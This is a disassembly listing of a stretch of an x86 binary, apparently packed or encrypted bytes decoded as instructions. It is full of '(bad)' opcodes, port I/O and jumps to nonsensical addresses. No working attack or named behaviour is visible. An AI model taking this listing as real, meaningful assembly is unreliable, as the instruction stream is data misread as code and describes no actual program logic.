  406861:	mov    ebp,DWORD PTR [esi]
  406863:	out    0xfa,al
  406865:	das    
  406866:	sub    bh,ch
  406868:	jmp    0x4068a4
  40686a:	sub    ch,ah
  40686c:	fild   QWORD PTR [eax-0x7a]
  40686f:	mov    eax,0xfb8c93da
  406874:	mov    edi,0x48f05d93
  406879:	inc    ebp
  40687a:	mov    ebx,0x1b7bbc7f
  40687f:	sbb    BYTE PTR [edx],dl
  406881:	inc    ecx
  406882:	and    eax,0xdc49f073
  406887:	repnz loope 0x40680d
  40688a:	bound  eax,QWORD PTR [eax+ebx*8]
  40688d:	out    dx,al
  40688e:	sbb    esi,DWORD PTR [edi+eiz*4-0x3dd12f25]
  406895:	mov    ds:0xcbb0d1ed,al
  40689a:	xchg   BYTE PTR [ebx+0x36fc3ab2],dl
  4068a0:	xchg   esp,eax
  4068a1:	inc    ecx
  4068a2:	(bad)  
  4068a3:	pop    ebx
  4068a4:	xchg   ecx,eax
  4068a5:	inc    edi
  4068a6:	test   bh,cl
  4068a8:	retf   0x2645
  4068ab:	xchg   ebx,eax
  4068ac:	or     eax,0x63320b6e
  4068b1:	sbb    al,0x3b
  4068b3:	mov    edx,gs
  4068b5:	imul   esi,DWORD PTR [esi+0x58073af],0x10
  4068bc:	xchg   DWORD PTR [ecx],eax
  4068be:	in     eax,0x82
  4068c0:	cmp    DWORD PTR [esi+0xb1e4156],eax
  4068c6:	mov    al,ds:0xeb0009e2
  4068cb:	sub    al,0x1c
  4068cd:	fcomp  DWORD PTR [edi]
  4068cf:	dec    edi
  4068d0:	xchg   esp,eax
  4068d1:	imul   eax,ebp,0xb21210f8
  4068d7:	aas    
  4068d8:	or     eax,0xa692721
  4068dd:	push   edi
  4068de:	mov    dh,0x92
  4068e0:	std    
  4068e1:	(bad)  
  4068e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068e3:	int    0x91
  4068e5:	dec    esp
  4068e6:	pop    edx
  4068e7:	or     cl,BYTE PTR [bx-0x67]
  4068eb:	out    0xdf,al
  4068ed:	and    DWORD PTR [ebx+0x7],esi
  4068f0:	jecxz  0x4068e1
  4068f2:	enter  0xac2b,0x2a
  4068f6:	retf   0x7281
  4068f9:	cmp    ecx,DWORD PTR [eax]
  4068fb:	add    DWORD PTR [ecx+edi*8],eax
  4068fe:	cmp    eax,0x9121cb25
  406903:	shl    DWORD PTR [ebx+0x594a63e2],1
  406909:	jecxz  0x40688e
  40690b:	jne    0x4068ea
  40690d:	sbb    al,0x2f
  40690f:	and    ebx,DWORD PTR [edx+0x20d93979]
  406915:	xor    BYTE PTR [ecx-0xf],0x83
  406919:	mov    ecx,fs
  40691b:	mov    eax,ds:0x28ccf0b9
  406920:	adc    cl,BYTE PTR [ebx-0x44b566de]
  406926:	shl    DWORD PTR [bp+si+0x15],0x62
  40692b:	js     0x4068c9
  40692d:	cmp    BYTE PTR [eax+0x77],bl
  406930:	out    0x72,al
  406932:	ss stc 
  406934:	icebp  
  406935:	fidivr DWORD PTR [edx-0x413fb28f]
  40693b:	cmp    eax,0x98dea4c6
  406940:	sbb    al,0x5b
  406942:	pop    ds
  406943:	jnp    0x4068df
  406945:	fldenv [edi-0x64]
  406948:	hlt    
  406949:	ss xchg edi,eax
  40694b:	cdq    
  40694c:	iret   
  40694d:	repnz push edx
  40694f:	inc    edx
  406950:	rol    DWORD PTR [eax+ebx*8],cl
  406953:	aaa    
  406954:	out    0x9f,eax
  406956:	xor    DWORD PTR [edx],0x2ff6ce5a
  40695c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40695d:	(bad)  
  40695f:	lods   eax,DWORD PTR ds:[esi]
  406960:	iret   
  406961:	jecxz  0x4069cf
  406963:	cdq    
  406964:	call   0xc9049e37
  406969:	std    
  40696a:	sbb    BYTE PTR ds:0x957781e8,cl
  406970:	and    edi,DWORD PTR [eax]
  406972:	repz rcr BYTE PTR [ebp-0x1c6cc4e1],1
  406979:	mov    al,ds:0x6476e651
  40697e:	repz test BYTE PTR [edx-0x67576f12],dl
  406985:	sbb    cl,bl
  406987:	(bad)  
  406988:	cmovns ebx,edi
  40698b:	out    0x47,al
  40698d:	pop    edx
  40698e:	mov    ebp,0x10f3b420
  406993:	pop    esp
  406994:	push   cs
  406995:	xor    ebx,DWORD PTR [edi+0x3b]
  406998:	in     eax,dx
  406999:	shl    BYTE PTR [esi-0x35],0x5
  40699d:	movd   DWORD PTR [eax+0x1a],mm7
  4069a1:	and    ch,BYTE PTR [esp+edx*8]
  4069a4:	mov    edi,0x4e679ecc
  4069a9:	mov    BYTE PTR [esi-0x4f],al
  4069ac:	cmovl  esi,DWORD PTR [ebx-0x33]
  4069b0:	dec    eax
  4069b1:	xchg   BYTE PTR [edi+0x5e6d076a],bh
  4069b7:	jne    0x406951
  4069b9:	imul   eax,DWORD PTR [eax+ecx*8],0xffffffa7
  4069bd:	scas   al,BYTE PTR es:[edi]
  4069be:	call   0x61ae:0x2101defb
  4069c5:	fwait
  4069c6:	jmp    0x2fb3:0xf3aab9c0
  4069cd:	or     eax,0xe75303e6
  4069d2:	dec    ebp
  4069d3:	push   ecx
  4069d4:	pop    ss
  4069d5:	mov    dl,0x64
  4069d7:	jae    0x40695c
  4069d9:	rcr    BYTE PTR [ebp-0x57c3df56],cl
  4069df:	aad    0x49
  4069e1:	ja     0x4069e6
  4069e3:	mov    WORD PTR [ebp+edi*4+0x1e],fs
  4069e7:	rol    edx,cl
  4069e9:	push   ss
  4069ea:	cmp    BYTE PTR [ebx],dl
  4069ec:	dec    ecx
  4069ed:	sti    
  4069ee:	popa   
  4069ef:	jne    0x4069a4
  4069f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069f2:	mov    ds:0xd423bd9b,al
  4069f7:	shr    BYTE PTR [edx-0x7e600b69],cl
  4069fd:	xchg   edi,eax
  4069fe:	cmp    BYTE PTR [edi+0x7d9cb6f6],dl
  406a04:	dec    ecx
  406a05:	ja     0x406a82
  406a07:	out    dx,eax
  406a08:	xor    bl,ah
  406a0a:	hlt    
  406a0b:	retf   
  406a0c:	fnsave [edx+0x55efd6d8]
  406a12:	retf   0x74b7
  406a15:	js     0x40699b
  406a17:	inc    ebx
  406a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a19:	hlt    
  406a1a:	jle    0x406a4d
  406a1c:	mov    ds:0x5547d479,al
  406a21:	push   ds
  406a22:	aas    
  406a23:	jp     0x406a00
  406a25:	cmp    dl,BYTE PTR [ebp+eax*8-0x16b1dcf0]
  406a2c:	pop    edx
  406a2d:	ret    
  406a2e:	jno    0x406a25
  406a30:	xor    eax,DWORD PTR [ebp+0x3cb8a0d5]
  406a36:	inc    ebp
  406a37:	cmp    BYTE PTR [edi],0xab
  406a3a:	fsubrp st(7),st
  406a3c:	call   0xcffa:0xae50ed20
  406a43:	bound  ecx,QWORD PTR [eax]
  406a45:	jge    0x406a21
  406a47:	xchg   ecx,eax
  406a48:	(bad)  
  406a49:	(bad)  
  406a4a:	mov    ch,0x43
  406a4c:	and    eax,0x46e628e8
  406a51:	dec    ecx
  406a52:	lea    esi,[ebx-0x272f8aaa]
  406a58:	fcomp  st(5)
  406a5a:	repz neg BYTE PTR [ecx-0x9]
  406a5e:	add    esp,DWORD PTR [ebp+ebp*1+0x48]
  406a62:	cs iret 
  406a64:	loop   0x406a1c
  406a66:	push   ds
  406a67:	stos   DWORD PTR es:[edi],eax
  406a68:	fidiv  WORD PTR ds:0x96076556
  406a6e:	mov    ds:0xd6f382c3,eax
  406a73:	jae    0x406a0b
  406a75:	push   ss
  406a76:	and    DWORD PTR [ebx],edi
  406a78:	xor    BYTE PTR [esi],bh
  406a7a:	mov    eax,ds:0xb654d664
  406a7f:	loop   0x406af6
  406a81:	mov    BYTE PTR [edi],ah
  406a83:	rcl    DWORD PTR [edx-0x3c],0x8e
  406a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a88:	cmp    edi,edi
  406a8a:	jecxz  0x406a84
  406a8c:	and    dl,bl
  406a8e:	ds inc esi
  406a90:	jne    0x406a51
  406a92:	jge    0x406a79
  406a94:	test   eax,0xd67abb7a
  406a99:	gs je  0x406a1c
  406a9c:	pop    ss
  406a9d:	xor    ebp,DWORD PTR [eax-0x7c8870f9]
  406aa3:	jp     0x406a34
  406aa5:	sbb    BYTE PTR [ebx],ch
  406aa7:	pop    eax
  406aa8:	(bad)  [ecx]
  406aaa:	fs jecxz 0x406aca
  406aad:	jle    0x406a88
  406aaf:	loop   0x406a54
  406ab1:	cli    
  406ab2:	pop    edi
  406ab3:	jnp    0x406b33
  406ab5:	inc    edi
  406ab6:	ja     0x406aa8
  406ab8:	(bad)  
  406aba:	xlat   BYTE PTR ds:[ebx]
  406abb:	scas   eax,DWORD PTR es:[edi]
  406abc:	into   
  406abd:	inc    edi
  406abe:	(bad)  
  406abf:	imul   edi,ebx,0x10
  406ac2:	(bad)  
  406ac3:	ja     0x406aa5
  406ac5:	cmp    al,BYTE PTR [ecx]
  406ac7:	lods   eax,DWORD PTR ds:[esi]
  406ac8:	pusha  
  406ac9:	xor    DWORD PTR [edx+0x57],edi
  406acc:	retf   0x28f1
  406acf:	test   BYTE PTR [ecx-0xf],al
  406ad2:	adc    ecx,DWORD PTR [edx+0x52]
  406ad5:	mov    WORD PTR [esi-0x27],gs
  406ad8:	mov    edx,0x45791a39
  406add:	add    bh,BYTE PTR [eax-0x56]
  406ae0:	aam    0xed
  406ae2:	dec    eax
  406ae3:	ins    DWORD PTR es:[edi],dx
  406ae4:	out    0x8f,eax
  406ae6:	push   cs
  406ae7:	pop    ebp
  406ae8:	cli    
  406ae9:	jmp    0xe8a3f3d7
  406aee:	stos   BYTE PTR es:[edi],al
  406aef:	addr16 inc ebx
  406af1:	in     eax,0xbb
  406af3:	add    DWORD PTR [edx-0x10d514b8],esp
  406af9:	mov    ah,0xd0
  406afb:	adc    al,0x93
  406afd:	xchg   edi,eax
  406afe:	inc    eax
  406aff:	sub    edi,0x37b1ae2b
  406b05:	xor    BYTE PTR [edx+0x47],cl
  406b08:	push   esp
  406b09:	jl     0x406b71
  406b0b:	out    dx,al
  406b0c:	adc    dh,BYTE PTR [ebp+0x2eb26c62]
  406b12:	sti    
  406b13:	rcl    ebx,0x1
  406b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b17:	inc    ecx
  406b18:	mov    bh,BYTE PTR [eax+0x48]
  406b1b:	test   DWORD PTR [edi+0x7f037be8],ebx
  406b21:	scas   al,BYTE PTR es:[edi]
  406b22:	sub    ebx,DWORD PTR [edi-0x45e9042e]
  406b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b29:	scas   eax,DWORD PTR es:[edi]
  406b2a:	cs in  eax,dx
  406b2c:	inc    esi
  406b2d:	mov    ds:0xc55ab593,eax
  406b32:	add    ecx,DWORD PTR [edi]
  406b34:	scas   eax,DWORD PTR es:[edi]
  406b35:	out    0x12,eax
  406b37:	fcomp  QWORD PTR [ebp+0x51e5796]
  406b3d:	mov    dl,0x80
  406b3f:	loopne 0x406adc
  406b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b42:	mov    al,ds:0x246c507e
  406b47:	adc    edx,DWORD PTR [ecx+esi*1]
  406b4a:	jne    0x406ad2
  406b4c:	lods   al,BYTE PTR ds:[esi]
  406b4d:	add    DWORD PTR [ebp-0x3323136d],0x3d
  406b54:	pop    es
  406b55:	cwde   
  406b56:	xor    eax,edx
  406b58:	cmp    BYTE PTR [ecx],0x64
  406b5b:	out    dx,al
  406b5c:	push   ss
  406b5d:	bound  edx,QWORD PTR [edi+0x76db0cec]
  406b63:	adc    esi,edi
  406b65:	loop   0x406bdb
  406b67:	or     edi,DWORD PTR [ebp+0x6]
  406b6a:	js     0x406bc8
  406b6c:	mov    dh,0xba
  406b6e:	shl    BYTE PTR [eax],cl
  406b70:	stc    
  406b71:	dec    eax
  406b72:	lahf   
  406b73:	pop    ss
  406b74:	mov    DWORD PTR [ebx-0x44],eax
  406b77:	cli    
  406b78:	into   
  406b79:	xchg   DWORD PTR [edi+0x1f],edi
  406b7c:	pop    eax
  406b7d:	mov    cl,0xc7
  406b7f:	cmp    eax,esp
  406b81:	and    al,0x25
  406b83:	mov    edi,0x20ef10fa
  406b88:	dec    edx
  406b89:	dec    esp
  406b8a:	and    ch,BYTE PTR fs:[eax-0x7327f5e2]
  406b91:	add    DWORD PTR [edx+0x47],ebp
  406b94:	mov    ebp,ecx
  406b96:	jl     0x406bce
  406b98:	das    
  406b99:	and    eax,0x7f54097f
  406b9e:	and    BYTE PTR [edi],bh
  406ba0:	test   eax,0x7f0ae714
  406ba5:	sbb    DWORD PTR [edx],ecx
  406ba7:	in     eax,dx
  406ba8:	test   ch,ch
  406baa:	xchg   ebx,eax
  406bab:	xor    eax,0xb5c8ed5a
  406bb0:	and    eax,0x58864184
  406bb5:	(bad)  
  406bb6:	pop    ebx
  406bb7:	retf   0x67ba
  406bba:	and    BYTE PTR [edx+0x4bd2e0f5],cl
  406bc0:	push   ecx
  406bc1:	jecxz  0x406ba7
  406bc3:	mov    bl,0xda
  406bc5:	scas   al,BYTE PTR es:[edi]
  406bc6:	sbb    ch,ch
  406bc8:	push   edx
  406bc9:	xchg   edx,eax
  406bca:	(bad)  
  406bcb:	adc    eax,0x7230c1b9
  406bd0:	dec    ecx
  406bd1:	dec    ebp
  406bd2:	push   edi
  406bd3:	ret    0xcbd8
  406bd6:	rcr    esi,1
  406bd8:	or     eax,0xc2b5ed37
  406bdd:	daa    
  406bde:	sbb    edx,DWORD PTR [edi]
  406be0:	xor    eax,0xae039f34
  406be5:	lods   eax,DWORD PTR ds:[esi]
  406be6:	cli    
  406be7:	fistp  DWORD PTR [eax-0x55fd27ec]
  406bed:	ret    
  406bee:	and    bl,cl
  406bf0:	jle    0x406bd8
  406bf2:	cld    
  406bf3:	mov    eax,0x901ccb2c
  406bf8:	mov    ah,0x75
  406bfa:	(bad)  
  406bfb:	call   DWORD PTR [esi+ebp*4]
  406bfe:	jmp    0xd5f7748c
  406c03:	cs mov ah,0x1e
  406c06:	mov    edx,DWORD PTR [eax]
  406c08:	(bad)  
  406c09:	retf   
  406c0a:	and    al,0x23
  406c0c:	cmp    ebp,DWORD PTR [ecx]
  406c0e:	out    0x44,al
  406c10:	xor    BYTE PTR [esi],al
  406c12:	imul   ecx,DWORD PTR [eax],0x19
  406c15:	jo     0x406c1d
  406c17:	cli    
  406c18:	je     0x406bad
  406c1a:	in     al,0x34
  406c1c:	ror    DWORD PTR [eax],1
  406c1e:	mov    esi,0x2ca01670
  406c23:	bound  ebp,QWORD PTR [ebp+eiz*8-0x1074a98c]
  406c2a:	pop    edi
  406c2b:	dec    esi
  406c2c:	push   ds
  406c2d:	js     0x406c77
  406c2f:	and    DWORD PTR [edx],esi
  406c31:	and    bl,BYTE PTR [esi+0x3b]
  406c34:	and    cl,BYTE PTR fs:[esi]
  406c37:	sahf   
  406c38:	(bad)  
  406c39:	jmp    0x4e13f645
  406c3e:	mov    edx,0xd427b76d
  406c43:	adc    al,0x75
  406c45:	sbb    DWORD PTR [ebx+eiz*2+0x4d6cf9a1],0x8716cacf
  406c50:	fmul   DWORD PTR [edx]
  406c52:	imul   eax,DWORD PTR [esi],0xbd8d6e1f
  406c58:	inc    esp
  406c59:	outs   dx,BYTE PTR ds:[esi]
  406c5a:	lods   al,BYTE PTR ds:[esi]
  406c5b:	jmp    0xb431f283
  406c60:	xchg   BYTE PTR [ebp-0x36],al
  406c63:	fsubr  st(1),st
  406c65:	js     0x406c0c
  406c67:	or     eax,0x3f533520
  406c6c:	neg    BYTE PTR [ebx-0x633ba70]
  406c72:	ins    DWORD PTR es:[edi],dx
  406c73:	mov    ebp,0xe729c046
  406c78:	push   0xfffffffe
  406c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c7b:	dec    ecx
  406c7c:	aaa    
  406c7d:	dec    eax
  406c7e:	mov    esp,0xbce7f197
  406c83:	mov    al,0xc9
  406c85:	add    bh,ch
  406c87:	sub    edx,DWORD PTR [ecx+0x8]
  406c8a:	xlat   BYTE PTR ds:[ebx]
  406c8b:	shr    BYTE PTR [edi],1
  406c8d:	mov    dh,0xc
  406c8f:	test   BYTE PTR [edx-0x34],ch
  406c92:	or     BYTE PTR [ebx-0x3ae44683],bh
  406c98:	and    dl,BYTE PTR [edi-0x6e73c44e]
  406c9e:	in     eax,dx
  406c9f:	fst    QWORD PTR [esi+0x3]
  406ca2:	and    bl,al
  406ca4:	call   0x8523dd14
  406ca9:	push   esi
  406caa:	retf   0xeb26
  406cad:	pop    eax
  406cae:	inc    eax
  406caf:	push   edx
  406cb0:	lahf   
  406cb1:	dec    ebx
  406cb2:	sahf   
  406cb3:	ins    BYTE PTR es:[edi],dx
  406cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cb5:	into   
  406cb6:	mov    ah,0x44
  406cb8:	add    BYTE PTR [edx],dh
  406cba:	outs   dx,BYTE PTR ds:[esi]
  406cbb:	mov    eax,0x1bc4fd9e
  406cc0:	or     BYTE PTR [ecx-0x57],al
  406cc3:	dec    esi
  406cc4:	(bad)  
  406cc5:	imul   ebp,eax,0x5581d118
  406ccb:	lahf   
  406ccc:	stc    
  406ccd:	adc    edx,ebp
  406ccf:	xor    esp,DWORD PTR [esi+ecx*2-0x17b1e28c]
  406cd6:	pop    ecx
  406cd7:	daa    
  406cd8:	sub    eax,0x3265df2b
  406cdd:	cli    
  406cde:	outs   dx,DWORD PTR ds:[esi]
  406cdf:	and    al,bh
  406ce1:	sub    eax,0xe3460e4
  406ce6:	imul   edx,DWORD PTR [eax+0x75],0x41f7f02f
  406ced:	outs   dx,BYTE PTR ds:[esi]
  406cee:	hlt    
  406cef:	out    dx,al
  406cf0:	add    eax,0xf97ee516
  406cf5:	mov    BYTE PTR [ebp+0x11fb1db6],cl
  406cfb:	xchg   edi,eax
  406cfc:	icebp  
  406cfd:	sti    
  406cfe:	pusha  
  406cff:	int3   
  406d00:	sbb    bh,BYTE PTR [ecx]
  406d02:	cmp    eax,DWORD PTR [ebp+0x18]
  406d05:	mov    es,WORD PTR [ecx+0x6e9d3811]
  406d0b:	dec    eax
  406d0c:	sub    eax,0x23a3909f
  406d11:	scas   eax,DWORD PTR es:[edi]
  406d12:	mov    ch,0xe8
  406d14:	ss lock in al,0xa5
  406d18:	jle    0x406d80
  406d1a:	out    0x37,al
  406d1c:	shl    BYTE PTR [edi+0x40],cl
  406d1f:	pusha  
  406d20:	test   eax,0x5d937125
  406d25:	jno    0x406d2d
  406d27:	push   es
  406d28:	mov    dl,0x21
  406d2a:	xchg   esi,eax
  406d2b:	in     eax,dx
  406d2c:	cwde   
  406d2d:	inc    edx
  406d2e:	js     0x406cba
  406d30:	jmp    0xced9020d
  406d35:	sahf   
  406d36:	sahf   
  406d37:	push   ebx
  406d38:	or     ch,BYTE PTR [edi+ebp*2-0x65]
  406d3c:	dec    eax
  406d3d:	(bad)  
  406d3e:	loopne 0x406d9d
  406d40:	xchg   ebx,eax
  406d41:	in     al,dx
  406d42:	inc    edi
  406d43:	jmp    0xfa89a2ce
  406d48:	and    dl,BYTE PTR [ebx+0x70793799]
  406d4e:	(bad)  
  406d4f:	outs   dx,BYTE PTR ds:[esi]
  406d50:	imul   edx,DWORD PTR [edi],0x7b
  406d53:	jecxz  0x406d0d
  406d55:	adc    edi,ecx
  406d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d58:	in     al,0x47
  406d5a:	lds    eax,FWORD PTR [ecx]
  406d5c:	pop    esi
  406d5d:	jmp    0xfc7fc217
  406d62:	(bad)  
  406d63:	js     0x406dae
  406d65:	es das 
  406d67:	inc    esi
  406d68:	scas   eax,DWORD PTR es:[edi]
  406d69:	mov    ebp,0xcdf62501
  406d6e:	loop   0x406d2e
  406d70:	sub    DWORD PTR [esi-0x6ebd1aa0],eax
  406d76:	mov    ds:0xd3bc53b,al
  406d7b:	xchg   BYTE PTR [edi-0xe],bl
  406d7e:	(bad)  [ebx]
  406d80:	(bad)
  406d84:	lods   eax,DWORD PTR ds:[esi]
  406d85:	aas    
  406d86:	loopne 0x406e01
  406d88:	push   esp
  406d89:	push   cs
  406d8a:	jns    0x406d47
  406d8c:	jno    0x406d79
  406d8e:	adc    esp,ebx
  406d90:	gs add al,0xd
  406d93:	in     al,dx
  406d94:	xor    ebx,eax
  406d96:	aam    0x6a
  406d98:	call   0x747b5c95
  406d9d:	ds pop ss
  406d9f:	pop    esp
  406da0:	dec    esi
  406da1:	mov    edi,0x98eb649d
  406da6:	fwait
  406da7:	dec    edi
  406da8:	add    edx,edx
  406daa:	sub    bh,BYTE PTR [ecx]
  406dac:	jne    0x406d55
  406dae:	sub    BYTE PTR [ebp+0x50fc2d71],dl
  406db4:	jecxz  0x406e0d
  406db6:	lea    eax,[eax]
  406db8:	scas   eax,DWORD PTR es:[edi]
  406db9:	mov    ebp,0xf7227c1f
  406dbe:	sub    DWORD PTR [ecx+0x35],edx
  406dc1:	pop    esp
  406dc2:	jmp    DWORD PTR [eax+0x76914ac9]
  406dc8:	fld    QWORD PTR [esi]
  406dca:	inc    ebx
  406dcb:	adc    al,0xf2
  406dcd:	xchg   BYTE PTR [ebx-0x479192c2],cl
  406dd3:	or     esp,0xe560a2fd
  406dd9:	lock jp 0x406d73
  406ddc:	mov    cl,0x4e
  406dde:	in     eax,dx
  406ddf:	iret   
  406de0:	push   esp
  406de1:	aam    0xc3
  406de3:	lea    esp,[ecx]
  406de5:	fxch   st(4)
  406de7:	enter  0xe523,0xe6
  406deb:	xchg   ebx,eax
  406dec:	loop   0x406d89
  406dee:	imul   ebx,DWORD PTR ss:[eax],0xffffff9f
  406df2:	push   edi
  406df3:	js     0x406e0f
  406df5:	inc    edi
  406df6:	std    
  406df7:	xchg   BYTE PTR [edi],bl
  406df9:	xor    eax,0xc4160d7f
  406dfe:	or     al,0x34
  406e00:	pop    edx
  406e01:	mov    BYTE PTR [eax-0x2e89cd69],dh
  406e07:	cmp    DWORD PTR [eax+0xfc3ebdc],ecx
  406e0d:	sub    BYTE PTR [eax],ch
  406e0f:	int    0x43
  406e11:	loopne 0x406dfc
  406e13:	push   ecx
  406e14:	or     DWORD PTR [esi],0x111e7560
  406e1a:	retf   0x2fee
  406e1d:	nop
  406e1e:	ss jns 0x406df2
  406e21:	repnz mov DWORD PTR [edi-0x69],ecx
  406e25:	jo     0x406e28
  406e27:	cmp    ebx,edx
  406e29:	sbb    BYTE PTR [ebx+0x27],0xd1
  406e2d:	inc    ebx
  406e2e:	cli    
  406e2f:	adc    bl,BYTE PTR [edi+0x54d8af17]
  406e35:	in     eax,0xad
  406e37:	push   ebx
  406e38:	pop    ecx
  406e39:	int3   
  406e3a:	cmp    esi,ebx
  406e3c:	call   0x8fb1a111
  406e41:	mov    esi,0x64c3df65
  406e46:	jp     0x406e50
  406e48:	mov    ds:0xd865eaa4,eax
  406e4d:	test   eax,0xdcc1b710
  406e52:	ja     0x406e69
  406e54:	xchg   ebx,eax
  406e55:	inc    edi
  406e56:	popf   
  406e57:	or     DWORD PTR [ebx+eax*2-0x2e289804],ecx
  406e5e:	(bad)  
  406e5f:	loopne 0x406eb0
  406e61:	int3   
  406e62:	imul   DWORD PTR [edx]
  406e64:	stc    
  406e65:	imul   ebx,ebx,0x98df2c6c
  406e6b:	pop    edx
  406e6c:	push   ss
  406e6d:	pushf  
  406e6e:	inc    BYTE PTR [eax]
  406e70:	push   ds
  406e71:	icebp  
  406e72:	call   0xf117194b
  406e77:	std    
  406e78:	or     BYTE PTR ds:[ebx+0x54],al
  406e7c:	push   ebp
  406e7d:	cmp    eax,0x2b935607
  406e82:	jmp    0x406e82
  406e84:	jo     0x406e07
  406e86:	push   eax
  406e87:	scas   eax,DWORD PTR es:[edi]
  406e88:	xor    DWORD PTR [ebp-0x25b32cd5],esp
  406e8e:	enter  0x7216,0x25
  406e92:	mov    esi,0xa5779436
  406e97:	jns    0x406e59
  406e99:	aad    0xc0
  406e9b:	xchg   esp,eax
  406e9c:	retf   0xc1c
  406e9f:	out    dx,eax
  406ea0:	out    dx,eax
  406ea1:	loope  0x406e36
  406ea3:	push   ecx
  406ea4:	jmp    0x6637e7d3
  406ea9:	jp     0x406f06
  406eab:	lahf   
  406eac:	pop    esp
  406ead:	clc    
  406eae:	sub    eax,edi
  406eb0:	jle    0x406f2a
  406eb2:	out    0xbe,al
  406eb4:	fcomp  DWORD PTR [ecx+ebp*2+0x680ff014]
  406ebb:	iret   
  406ebc:	dec    edi
  406ebd:	push   eax
  406ebe:	out    0x47,al
  406ec0:	pusha  
  406ec1:	mov    ebx,ebx
  406ec3:	jae    0x406ee9
  406ec5:	add    ch,ch
  406ec7:	stos   DWORD PTR es:[edi],eax
  406ec8:	pop    eax
  406ec9:	sub    dh,bl
  406ecb:	adc    ch,BYTE PTR [esi]
  406ecd:	into   
  406ece:	mov    ds:0x5605863b,al
  406ed3:	pusha  
  406ed4:	jbe    0x406ef5
  406ed6:	enter  0x7c6e,0x90
  406eda:	push   0x19
  406edc:	push   es
  406edd:	rcr    ebp,cl
  406edf:	inc    edi
  406ee0:	push   0xffffff98
  406ee2:	dec    DWORD PTR [esi]
  406ee4:	imul   ebp,eax,0xffffff88
  406ee7:	mov    edx,0x685cfe2c
  406eec:	(bad)  
  406eee:	mov    edx,0x5f311f56
  406ef3:	and    dx,0x8fc4
  406ef8:	inc    eax
  406ef9:	ds in  al,0xbe
  406efc:	call   0xabca:0x3b30f7e0
  406f03:	out    0xd9,al
  406f05:	push   esi
  406f06:	jbe    0x406ea9
  406f08:	stos   DWORD PTR es:[edi],eax
  406f09:	popw   es
  406f0b:	inc    esp
  406f0c:	nop
  406f0d:	inc    esi
  406f0e:	jp     0x406ea0
  406f10:	or     ebx,DWORD PTR [ebx+ecx*2-0x36]
  406f14:	data16 (bad) 
  406f16:	cmp    BYTE PTR [edi+0x20a71ba6],ah
  406f1c:	pop    esi
  406f1d:	fptan  
  406f1f:	inc    eax
  406f20:	jns    0x406f65
  406f22:	push   ebp
  406f23:	aad    0xb8
  406f25:	adc    DWORD PTR [ebp+0x29],eax
  406f28:	cmp    bl,BYTE PTR [ebp-0x6b]
  406f2b:	inc    ebp
  406f2c:	mul    DWORD PTR [ecx+0x23]
  406f2f:	mov    al,0x7f
  406f31:	and    eax,edi
  406f33:	out    0x64,eax
  406f35:	xor    eax,0x67b0b8c5
  406f3a:	jmp    0xd35adff2
  406f3f:	mov    eax,ds:0x64b08a80
  406f44:	push   eax
  406f45:	repnz test DWORD PTR [ebx-0x4fc5dd11],edi
  406f4c:	xor    al,0xdf
  406f4e:	cmp    BYTE PTR [esi+eax*2],ah
  406f51:	and    DWORD PTR [ebx+0x76],ecx
  406f54:	adc    ah,BYTE PTR [eax-0x673c1262]
  406f5a:	mov    ecx,0xc8121d98
  406f5f:	out    0x6c,eax
  406f61:	repz bound edx,QWORD PTR [edx]
  406f64:	jmp    DWORD PTR [ecx]
  406f66:	(bad)  
  406f67:	mov    WORD PTR [ebp-0x5],fs
  406f6a:	push   es
  406f6b:	fs xor al,0x9e
  406f6e:	and    al,0x8b
  406f70:	cmp    al,0xdc
  406f72:	popa   
  406f73:	hlt    
  406f74:	cmp    esp,eax
  406f76:	xor    al,0x67
  406f78:	add    eax,0xb54d1998
  406f7d:	jbe    0x406f43
  406f7f:	push   ebx
  406f80:	rol    BYTE PTR [esi],cl
  406f82:	or     edi,DWORD PTR [ecx]
  406f84:	mov    eax,ds:0xd6022de
  406f89:	sbb    bh,BYTE PTR [esi+0x77186c56]
  406f8f:	jns    0x406f1b
  406f91:	dec    eax
  406f92:	jno    0x406fde
  406f94:	retf   0x428f
  406f97:	std    
  406f98:	sub    BYTE PTR [ebx+0x13e24015],bh
  406f9e:	frstor [ecx+ebp*8-0x72]
  406fa2:	mov    al,ds:0x36b51338
  406fa7:	fisub  DWORD PTR [esi+0x55249967]
  406fad:	(bad)  
  406fae:	adc    ch,dh
  406fb0:	push   esi
  406fb1:	loop   0x406f5d
  406fb3:	mov    ecx,0x53392cf1
  406fb8:	aad    0xf7
  406fba:	xchg   esp,eax
  406fbb:	push   0x23
  406fbd:	mov    ah,0x40
  406fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fc0:	jge    0x40701b
  406fc2:	jle    0x406f5d
  406fc4:	bound  ecx,QWORD PTR [ebx+esi*2+0x19]
  406fc8:	sbb    esi,edi
  406fca:	xor    eax,DWORD PTR cs:[ebx+ebp*1]
  406fce:	inc    ebp
  406fcf:	pop    ds
  406fd0:	mov    ds:0xcea018cf,eax
  406fd5:	or     al,0xc
  406fd7:	mov    cl,0xfc
  406fd9:	in     eax,dx
  406fda:	xor    DWORD PTR [edi+0x34d95480],ebx
  406fe0:	pop    edx
  406fe1:	push   ds
  406fe2:	cmp    cl,ah
  406fe4:	pop    DWORD PTR ds:0xcc7c9f8
  406fea:	jmp    0x40703d
  406fec:	div    BYTE PTR [edx]
  406fee:	mov    eax,0x575e334a
  406ff3:	idiv   BYTE PTR [eax-0x67]
  406ff6:	int    0xeb
  406ff8:	out    0x70,al
  406ffa:	fld    QWORD PTR [ecx]
  406ffc:	or     DWORD PTR [ebx+0xe],0x74
  407000:	xchg   ebx,eax
  407001:	fs arpl sp,si
  407004:	ret    
  407005:	and    BYTE PTR [ebx],al
  407007:	xchg   BYTE PTR [edx+0x1b],ch
  40700a:	sbb    eax,0x75615598
  40700f:	fldenv [edx+0x4089be4]
  407015:	ins    BYTE PTR es:[edi],dx
